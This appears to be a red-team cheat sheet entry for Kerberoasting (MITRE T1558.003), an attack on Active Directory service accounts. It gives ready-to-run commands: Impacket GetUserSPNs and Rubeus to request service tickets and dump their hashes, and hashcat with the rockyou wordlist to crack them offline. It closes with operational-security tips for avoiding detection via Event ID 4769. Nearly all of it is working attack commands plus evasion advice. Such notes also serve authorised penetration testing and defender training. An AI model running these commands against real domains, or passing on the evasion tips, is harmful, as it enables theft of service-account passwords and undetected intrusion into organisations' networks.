# Kerberoasting (T1558.003)

## Overview
Requesting service tickets (TGS) for service accounts and cracking the hashes offline to obtain the account's password.

## Execution

### Linux (Impacket)
```bash
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

### Windows (Rubeus)
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

## Cracking (Hashcat)
```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

## OPSEC Considerations
* Large numbers of TGS requests can trigger alerts (Event ID 4769).
* Target specific Service Principal Names (SPNs) rather than all of them.
